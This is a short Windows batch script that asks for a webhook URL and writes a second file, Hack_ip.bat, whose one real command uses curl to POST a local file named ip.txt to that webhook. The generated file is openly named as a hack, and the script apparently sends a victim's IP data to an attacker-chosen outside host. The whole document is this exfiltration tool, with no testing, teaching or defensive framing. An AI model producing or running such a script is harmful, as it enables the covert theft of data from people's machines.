@echo off
color c
SET /p webhook=" webhook >  "
echo cls >> Hack_ip.bat
echo curl -X POST -F "file=@ip.txt" "%webhook%" >>Hack_ip.bat
exit